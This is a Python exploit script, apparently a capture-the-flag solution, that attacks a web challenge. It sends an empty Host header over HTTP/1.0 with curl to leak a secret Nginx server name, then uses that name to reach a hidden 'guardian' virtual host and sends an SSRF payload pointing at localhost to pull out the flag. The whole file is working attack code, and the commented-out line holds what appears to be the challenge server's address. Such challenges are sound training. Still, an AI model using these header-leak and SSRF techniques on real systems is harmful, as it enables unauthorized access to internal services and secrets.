import requests
import subprocess
import json


BASE_URL = f"http://localhost:1337"
# BASE_URL = "http://154.57.164.83:30493"


# NOTE: Apparently `curl` is the only way to reliably leak the Host header.
#       Other approaches like `http.client` or `requests` don't support HTTP/1.0 anymore.
def run_curl(command_args: dict) -> str:
    try:
        result = subprocess.run(["curl"] + command_args, 
            capture_output=True, 
            text=True, 
            check=True
        )
        return result.stdout
    
    except subprocess.CalledProcessError as e:
        print(f"[-] Curl command failed: {e}")
        return None


def solve():
    print("[*] Leaking SECRET_VALLEY value using \"curl\"...")
    leak_args = [
        "-s",                # Silent mode (no progress bar)
        "-H", "Host:",       # Empty Host header
        "--http1.0",         # Force HTTP/1.0 to bypass 400 errors
        f"{BASE_URL}/think"
    ]
    
    # We hit /think with an empty Host header to force Nginx to use its default_server name.
    # HTTP/1.1 requires a Host header, so we use HTTP/1.0 to bypass this requirement and avoid 400 errors.
    leaked_host = run_curl(leak_args)
    if not leaked_host:
        print("[-] Failed to leak Host header.")
        exit(-1)

    secret_suffix = json.loads(leaked_host).get("host", "").replace("alley.", "")
    print(f"[!] Leaked Secret: {secret_suffix}")
    
    # The /guardian route is only available on the 'guardian' subdomain,
    # so we construct the target vhost using the leaked suffix.
    target_host = f"guardian.{secret_suffix}"
    ssrf_payload = {"quote": "http://localhost:1337/think"}
    
    print(f"[*] Sending SSRF payload to {target_host}...")
    
    # We must set the Host header so Nginx routes the request to the correct block
    response = requests.get(f"{BASE_URL}/guardian", params=ssrf_payload, headers={"Host": target_host})
    if response.status_code == 200:
        flag = json.loads(response.text).get("key", "")
        print(f"[!] Flag Leaked: {flag}")


if __name__ == "__main__":
    solve()